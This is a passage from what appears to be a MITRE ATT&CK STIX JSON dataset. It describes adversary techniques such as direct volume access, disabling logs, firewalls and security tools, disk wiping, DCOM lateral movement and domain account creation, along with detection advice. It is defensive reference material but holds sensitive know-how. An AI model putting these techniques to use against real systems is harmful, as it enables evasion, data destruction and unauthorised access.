lead time may be small and the indicator of an event availability of the network or service drops. The analysis tools mentioned can then be used to determine the type of DoS causing the outage and help with remediation.\",\"x_mitre_impact_type\":[\"Availability\"],\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"AWS\",\"GCP\",\"Azure AD\",\"SaaS\",\"Azure\",\"Office 365\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:20.934Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)\\n\\nUtilities, such as NinjaCopy, exist to perform these actions in PowerShell. (Citation: Github PowerSploit Ninjacopy)\",\"external_references\":[{\"external_id\":\"T1006\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1006\"},{\"description\":\"Hakobyan, A. (2009, January 8). FDump - Dumping File Sectors Directly from Disk using Logical Offsets. Retrieved November 12, 2014.\",\"source_name\":\"Hakobyan 2009\",\"url\":\"http://www.codeproject.com/Articles/32169/FDump-Dumping-File-Sectors-Directly-from-Disk-usin\"},{\"description\":\"Bialek, J. (2015, December 16). Invoke-NinjaCopy.ps1. Retrieved June 2, 2016.\",\"source_name\":\"Github PowerSploit Ninjacopy\",\"url\":\"https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1\"}],\"id\":\"attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-01-30T22:27:39.932Z\",\"name\":\"Direct Volume Access\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"API monitoring\"],\"x_mitre_defense_bypassed\":[\"File monitoring\",\"File system access controls\"],\"x_mitre_detection\":\"Monitor handle opens on drive volumes that are made by processes to determine when they may directly access logical drives. (Citation: Github PowerSploit Ninjacopy)\\n\\nMonitor processes and command-line arguments for actions that could be taken to copy files from the logical drive and evade common file system protections. Since this technique may also be used through [PowerShell](https://attack.mitre.org/techniques/T1086), additional logging of PowerShell scripts is recommended.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"Administrator\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"2.0\"}",
    "{\"created\":\"2020-02-21T20:46:36.688Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\\n\\nAdversaries may targeting system-wide logging or just that of a particular application. By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.\",\"external_references\":[{\"external_id\":\"T1562.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1562/002\"},{\"description\":\"Franklin Smith. (n.d.). Windows Security Log Events. Retrieved February 21, 2020.\",\"source_name\":\"Windows Log Events\",\"url\":\"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/\"}],\"id\":\"attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-29T22:02:33.870Z\",\"name\":\"Disable Windows Event Logging\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"Windows event logs\",\"Process command-line parameters\"],\"x_mitre_defense_bypassed\":[\"Log analysis\"],\"x_mitre_detection\":\"Monitor processes and command-line arguments for commands that can be used to disable logging. Lack of event logs may be suspicious.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-06-24T16:55:46.243Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004). \\n\\nCloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary may introduce new firewall rules or policies to allow access into a victim cloud environment. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups to allow any TCP/IP connectivity.(Citation: Expel IO Evil in AWS)\\n\\nModifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.\",\"external_references\":[{\"external_id\":\"T1562.007\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1562/007\"},{\"description\":\"Anthony Randazzo, Britton Manahan and Sam Lipton. (2020, April 28). Finding Evil in AWS. Retrieved June 25, 2020.\",\"source_name\":\"Expel IO Evil in AWS\",\"url\":\"https://expel.io/blog/finding-evil-in-aws/\"}],\"id\":\"attack-pattern--77532a55-c283-4cd2-bc5d-2d0b65e9d88c\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-07-07T13:49:05.345Z\",\"name\":\"Disable or Modify Cloud Firewall\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Expel\"],\"x_mitre_data_sources\":[\"Stackdriver logs\",\"GCP audit logs\",\"Azure activity logs\",\"AWS CloudTrail logs\"],\"x_mitre_detection\":\"Monitor cloud logs for modification or creation of new security groups or firewall rules.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"AWS\",\"GCP\",\"Azure\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-21T21:00:48.814Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\\n\\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. \",\"external_references\":[{\"external_id\":\"T1562.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1562/004\"}],\"id\":\"attack-pattern--5372c5fe-f424-4def-bcd5-d3a8e770f07b\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-29T22:18:11.166Z\",\"name\":\"Disable or Modify System Firewall\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Process command-line parameters\",\"Windows Registry\"],\"x_mitre_defense_bypassed\":[\"Firewall\"],\"x_mitre_detection\":\"Monitor processes and command-line arguments to see if firewalls are disabled or modified. Monitor Registry edits to keys that manage firewalls.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-21T20:32:20.810Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security tools scanning or reporting information.\",\"external_references\":[{\"external_id\":\"T1562.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1562/001\"},{\"external_id\":\"CAPEC-578\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/578.html\"}],\"id\":\"attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-29T21:52:43.151Z\",\"name\":\"Disable or Modify Tools\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Windows Registry\",\"Services\",\"File monitoring\"],\"x_mitre_defense_bypassed\":[\"Anti-virus\",\"Log analysis\",\"Signature-based detection\",\"Host intrusion prevention systems\",\"File monitoring\"],\"x_mitre_detection\":\"Monitor processes and command-line arguments to see if security tools are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Lack of log events may be suspicious.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"Administrator\"],\"x_mitre_platforms\":[\"Windows\",\"macOS\",\"Linux\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:07.958Z\",\"external_references\":[{\"external_id\":\"T1089\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1089\"},{\"external_id\":\"CAPEC-578\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/578.html\"}],\"id\":\"attack-pattern--2e0dd10b-676d-4964-acd0-8a404c92b044\",\"modified\":\"2020-02-21T20:35:48.979Z\",\"name\":\"Disabling Security Tools\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2019-03-29T14:59:50.763Z\",\"external_references\":[{\"external_id\":\"T1488\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1488\"},{\"description\":\"Novetta Threat Research Group. (2016, February 24). Operation Blockbuster: Unraveling the Long Thread of the Sony Attack. Retrieved February 25, 2016.\",\"source_name\":\"Novetta Blockbuster\",\"url\":\"https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf\"},{\"description\":\"Novetta Threat Research Group. (2016, February 24). Operation Blockbuster: Destructive Malware Report. Retrieved March 2, 2016.\",\"source_name\":\"Novetta Blockbuster Destructive Malware\",\"url\":\"https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf\"},{\"description\":\"Department of Justice. (2018, September 6). Criminal Complaint - United States of America v. PARK JIN HYOK. Retrieved March 29, 2019.\",\"source_name\":\"DOJ Lazarus Sony 2018\",\"url\":\"https://www.justice.gov/opa/press-release/file/1092091/download\"}],\"id\":\"attack-pattern--b82f7d37-b826-4ec9-9391-8e121c78aed7\",\"modified\":\"2020-02-20T22:07:27.495Z\",\"name\":\"Disk Content Wipe\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-20T22:06:41.739Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.\\n\\nAdversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: DOJ Lazarus Sony 2018) Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.(Citation: Novetta Blockbuster Destructive Malware) Adversaries have been observed leveraging third-party drivers like [RawDisk](https://attack.mitre.org/software/S0364) to directly access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) This behavior is distinct from [Data Destruction](https://attack.mitre.org/techniques/T1485) because sections of the disk are erased instead of individual files.\\n\\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)\",\"external_references\":[{\"external_id\":\"T1561.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1561/001\"},{\"description\":\"Novetta Threat Research Group. (2016, February 24). Operation Blockbuster: Unraveling the Long Thread of the Sony Attack. Retrieved February 25, 2016.\",\"source_name\":\"Novetta Blockbuster\",\"url\":\"https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf\"},{\"description\":\"Novetta Threat Research Group. (2016, February 24). Operation Blockbuster: Destructive Malware Report. Retrieved March 2, 2016.\",\"source_name\":\"Novetta Blockbuster Destructive Malware\",\"url\":\"https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf\"},{\"description\":\"Department of Justice. (2018, September 6). Criminal Complaint - United States of America v. PARK JIN HYOK. Retrieved March 29, 2019.\",\"source_name\":\"DOJ Lazarus Sony 2018\",\"url\":\"https://www.justice.gov/opa/press-release/file/1092091/download\"},{\"description\":\"Russinovich, M. & Garnier, T. (2017, May 22). Sysmon v6.20. Retrieved December 13, 2017.\",\"source_name\":\"Microsoft Sysmon v6 May 2017\",\"url\":\"https://docs.microsoft.com/sysinternals/downloads/sysmon\"}],\"id\":\"attack-pattern--fb640c43-aa6b-431e-a961-a279010424ac\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"impact\"}],\"modified\":\"2020-03-28T22:53:20.162Z\",\"name\":\"Disk Content Wipe\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Kernel drivers\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"Look for attempts to read/write to sensitive locations like the partition boot sector or BIOS parameter block/superblock. Monitor for direct access read/write attempts using the <code>\\\\\\\\\\\\\\\\.\\\\\\\\</code> notation.(Citation: Microsoft Sysmon v6 May 2017) Monitor for unusual kernel driver installation activity.\",\"x_mitre_impact_type\":[\"Availability\"],\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"SYSTEM\",\"root\",\"Administrator\",\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-03-19T19:38:27.097Z\",\"external_references\":[{\"external_id\":\"T1487\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1487\"},{\"description\":\"Symantec. (2012, August 16). The Shamoon Attacks. Retrieved March 14, 2019.\",\"source_name\":\"Symantec Shamoon 2012\",\"url\":\"https://www.symantec.com/connect/blogs/shamoon-attacks\"},{\"description\":\"FireEye. (2016, November 30). FireEye Responds to Wave of Destructive Cyber Attacks in Gulf Region. Retrieved January 11, 2017.\",\"source_name\":\"FireEye Shamoon Nov 2016\",\"url\":\"https://www.fireeye.com/blog/threat-research/2016/11/fireeye_respondsto.html\"},{\"description\":\"Falcone, R.. (2016, November 30). Shamoon 2: Return of the Disttrack Wiper. Retrieved January 11, 2017.\",\"source_name\":\"Palo Alto Shamoon Nov 2016\",\"url\":\"http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/\"},{\"description\":\"Kaspersky Lab. (2017, March 7). From Shamoon to StoneDrill: Wipers attacking Saudi organizations and beyond. Retrieved March 14, 2019.\",\"source_name\":\"Kaspersky StoneDrill 2017\",\"url\":\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf\"},{\"description\":\"Falcone, R. (2018, December 13). Shamoon 3 Targets Oil and Gas Organization. Retrieved March 14, 2019.\",\"source_name\":\"Unit 42 Shamoon3 2018\",\"url\":\"https://unit42.paloaltonetworks.com/shamoon-3-targets-oil-gas-organization/\"}],\"id\":\"attack-pattern--2e114e45-2c50-404c-804a-3af9564d240e\",\"modified\":\"2020-02-20T22:11:00.106Z\",\"name\":\"Disk Structure Wipe\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-20T22:10:20.484Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \\n\\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\\n\\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)\",\"external_references\":[{\"external_id\":\"T1561.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1561/002\"},{\"description\":\"Symantec. (2012, August 16). The Shamoon Attacks. Retrieved March 14, 2019.\",\"source_name\":\"Symantec Shamoon 2012\",\"url\":\"https://www.symantec.com/connect/blogs/shamoon-attacks\"},{\"description\":\"FireEye. (2016, November 30). FireEye Responds to Wave of Destructive Cyber Attacks in Gulf Region. Retrieved January 11, 2017.\",\"source_name\":\"FireEye Shamoon Nov 2016\",\"url\":\"https://www.fireeye.com/blog/threat-research/2016/11/fireeye_respondsto.html\"},{\"description\":\"Falcone, R.. (2016, November 30). Shamoon 2: Return of the Disttrack Wiper. Retrieved January 11, 2017.\",\"source_name\":\"Palo Alto Shamoon Nov 2016\",\"url\":\"http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/\"},{\"description\":\"Kaspersky Lab. (2017, March 7). From Shamoon to StoneDrill: Wipers attacking Saudi organizations and beyond. Retrieved March 14, 2019.\",\"source_name\":\"Kaspersky StoneDrill 2017\",\"url\":\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf\"},{\"description\":\"Falcone, R. (2018, December 13). Shamoon 3 Targets Oil and Gas Organization. Retrieved March 14, 2019.\",\"source_name\":\"Unit 42 Shamoon3 2018\",\"url\":\"https://unit42.paloaltonetworks.com/shamoon-3-targets-oil-gas-organization/\"},{\"description\":\"Russinovich, M. & Garnier, T. (2017, May 22). Sysmon v6.20. Retrieved December 13, 2017.\",\"source_name\":\"Microsoft Sysmon v6 May 2017\",\"url\":\"https://docs.microsoft.com/sysinternals/downloads/sysmon\"}],\"id\":\"attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"impact\"}],\"modified\":\"2020-03-28T23:00:00.367Z\",\"name\":\"Disk Structure Wipe\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Kernel drivers\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"Look for attempts to read/write to sensitive locations like the master boot record and the disk partition table. Monitor for direct access read/write attempts using the <code>\\\\\\\\\\\\\\\\.\\\\\\\\</code> notation.(Citation: Microsoft Sysmon v6 May 2017) Monitor for unusual kernel driver installation activity.\",\"x_mitre_impact_type\":[\"Availability\"],\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"root\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-20T22:02:20.372Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.\\n\\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)\",\"external_references\":[{\"external_id\":\"T1561\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1561\"},{\"description\":\"Novetta Threat Research Group. (2016, February 24). Operation Blockbuster: Destructive Malware Report. Retrieved March 2, 2016.\",\"source_name\":\"Novetta Blockbuster Destructive Malware\",\"url\":\"https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf\"},{\"description\":\"Russinovich, M. & Garnier, T. (2017, May 22). Sysmon v6.20. Retrieved December 13, 2017.\",\"source_name\":\"Microsoft Sysmon v6 May 2017\",\"url\":\"https://docs.microsoft.com/sysinternals/downloads/sysmon\"}],\"id\":\"attack-pattern--1988cc35-ced8-4dad-b2d1-7628488fa967\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"impact\"}],\"modified\":\"2020-03-28T23:00:00.599Z\",\"name\":\"Disk Wipe\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Kernel drivers\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"Look for attempts to read/write to sensitive locations like the partition boot sector, master boot record, disk partition table, or BIOS parameter block/superblock. Monitor for direct access read/write attempts using the <code>\\\\\\\\\\\\\\\\.\\\\\\\\</code> notation.(Citation: Microsoft Sysmon v6 May 2017) Monitor for unusual kernel driver installation activity.\",\"x_mitre_impact_type\":[\"Availability\"],\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"root\",\"SYSTEM\",\"Administrator\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-11T18:26:36.444Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.\\n\\nThe Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)(Citation: Microsoft COM)\\n\\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.(Citation: Microsoft Process Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.(Citation: Microsoft COM ACL)\\n\\nThrough DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents(Citation: Enigma Excel DCOM Sept 2017) and may also invoke Dynamic Data Exchange (DDE) execution directly through a COM created instance of a Microsoft Office application(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document.\",\"external_references\":[{\"external_id\":\"T1021.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1021/003\"},{\"description\":\"Hamilton, C. (2019, June 4). Hunting COM Objects. Retrieved June 10, 2019.\",\"source_name\":\"Fireeye Hunting COM June 2019\",\"url\":\"https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html\"},{\"description\":\"Microsoft. (n.d.). Component Object Model (COM). Retrieved November 22, 2017.\",\"source_name\":\"Microsoft COM\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx\"},{\"description\":\"Microsoft. (n.d.). Setting Process-Wide Security Through the Registry. Retrieved November 21, 2017.\",\"source_name\":\"Microsoft Process Wide Com Keys\",\"url\":\"https://msdn.microsoft.com/en-us/library/windows/desktop/ms687317(v=vs.85).aspx\"},{\"description\":\"Microsoft. (n.d.). DCOM Security Enhancements in Windows XP Service Pack 2 and Windows Server 2003 Service Pack 1. Retrieved November 22, 2017.\",\"source_name\":\"Microsoft COM ACL\",\"url\":\"https://docs.microsoft.com/en-us/windows/desktop/com/dcom-security-enhancements-in-windows-xp-service-pack-2-and-windows-server-2003-service-pack-1\"},{\"description\":\"Nelson, M. (2017, November 16). Lateral Movement using Outlook\'s CreateObject Method and DotNetToJScript. Retrieved November 21, 2017.\",\"source_name\":\"Enigma Outlook DCOM Lateral Movement Nov 2017\",\"url\":\"https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/\"},{\"description\":\"Nelson, M. (2017, January 5). Lateral Movement using the MMC20 Application COM Object. Retrieved November 21, 2017.\",\"source_name\":\"Enigma MMC20 COM Jan 2017\",\"url\":\"https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/\"},{\"description\":\"Nelson, M. (2017, January 23). Lateral Movement via DCOM: Round 2. Retrieved November 21, 2017.\",\"source_name\":\"Enigma DCOM Lateral Movement Jan 2017\",\"url\":\"https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/\"},{\"description\":\"Nelson, M. (2017, September 11). Lateral Movement using Excel.Application and DCOM. Retrieved November 21, 2017.\",\"source_name\":\"Enigma Excel DCOM Sept 2017\",\"url\":\"https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/\"},{\"description\":\"Tsukerman, P. (2017, November 8). Leveraging Excel DDE for lateral movement via DCOM. Retrieved November 21, 2017.\",\"source_name\":\"Cyberreason DCOM DDE Lateral Movement Nov 2017\",\"url\":\"https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom\"}],\"id\":\"attack-pattern--68a0c5ed-bee2-4513-830d-5b0d650139bd\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"lateral-movement\"}],\"modified\":\"2020-03-23T20:21:03.684Z\",\"name\":\"Distributed Component Object Model\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Windows event logs\",\"Windows Registry\",\"Process monitoring\",\"Packet capture\",\"DLL monitoring\",\"Authentication logs\",\"API monitoring\",\"PowerShell logs\"],\"x_mitre_detection\":\"Monitor for COM objects loading DLLs and other modules not typically associated with the application.(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) Enumeration of COM objects, via [Query Registry](https://attack.mitre.org/techniques/T1012) or [PowerShell](https://attack.mitre.org/techniques/T1059/001), may also proceed malicious use.(Citation: Fireeye Hunting COM June 2019)(Citation: Enigma MMC20 COM Jan 2017) Monitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on.\\n\\nMonitor for any influxes or abnormal increases in Distributed Computing Environment/Remote Procedure Call (DCE/RPC) traffic.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-01-28T14:05:17.825Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account.\\n\\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.\",\"external_references\":[{\"external_id\":\"T1136.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1136/002\"},{\"description\":\"Lich, B., Miroshnikov, A. (2017, April 5). 4720(S): A user account was created. Retrieved June 30, 2017.\",\"source_name\":\"Microsoft User Creation 